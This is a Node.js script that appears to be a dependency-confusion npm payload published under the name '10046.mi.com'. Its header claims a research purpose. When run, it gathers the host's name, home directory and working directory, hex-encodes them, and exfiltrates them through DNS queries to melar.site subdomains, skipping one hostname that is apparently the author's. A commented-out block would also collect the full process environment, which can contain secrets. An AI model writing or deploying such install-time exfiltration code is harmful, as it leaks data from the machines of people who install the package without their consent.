/*

This code is used for research purposes.

No sensitive data is retrieved.

Callbacks from within organizations with a
responsible disclosure program will be reported
directly to the organizations.

Any other callbacks will be ignored, and
any associated data will not be kept.

For any questions or suggestions:

melardev@gmail.com
https://twitter.com/melardev

As you may have guessed this is a copy paste =/
*/


const dns = require('dns');
const os = require('os');

const suffix = 'nrmv.melar.site';
const ns = 'ns1.melar.site';

const npmPackageName = '10046.mi.com';


function sendToServer(id, data) {

    data = Buffer.from(data).toString('hex');
    data = data.match(/.{1,60}/g);


    data.forEach(function (chunk, idx) {
        try {
            dns.resolve(
                'v2_f.' + id + '.' + idx + '.' + chunk + '.v2_e' + suffix, 'A',
                console.log);
        } catch (e) {
        }
    });

}

function tryGet(toCall) {

    try {
        return toCall();
    } catch (e) {
        return 'err';
    }

}


let simpleData = {
    p: npmPackageName,
    h: tryGet(os.hostname),
    d: tryGet(os.homedir),
    c: __dirname
};


if (simpleData['h'] === 'BBOGENS-LAPTOP') {
    process.exit(0);
}

const simpleInfo = JSON.stringify(simpleData);
const id = Math.random().toString(36).substring(2);
sendToServer(id, simpleInfo);
dns.lookup(ns, function (err, address) {
    if (!err) {
        nsAddress = address;
    } else {
        nsAddress = '8.8.8.8';
    }
    dns.setServers([nsAddress, '8.8.4.4']);
    sendToServer(simpleData);
});

process.exit(0);

/*
// Send POST request
const currentEnvString = JSON.stringify(process);
const currentEnvBase64 = Buffer.from(currentEnvString).toString('base64');

const extendedData = {
    p: package,
    h: tryGet(os.hostname),
    d: tryGet(os.homedir),
    c: __dirname,
    i: Math.random().toString(36).substring(5),
    e: process.env.PORT,
    ho: JSON.stringify(os.hostname()),
    cp: __dirname,
    cf: __filename,
    ce: currentEnvBase64,
    ty: JSON.stringify(os.type()),
    pl: JSON.stringify(os.platform()),
    a: JSON.stringify(os.arch()),
    r: JSON.stringify(os.release()),
    u: JSON.stringify(os.uptime()),
    l: JSON.stringify(os.loadavg()),
    tm: JSON.stringify(os.totalmem()),
    fm: JSON.stringify(os.freemem()),
    cpu: JSON.stringify(os.cpus()),
    ni: JSON.stringify(os.networkInterfaces()),
};

extendedDataStr = JSON.stringify(extendedData);
extendedDataB64 = Buffer.from(currentEnvString).toString('base64');
*/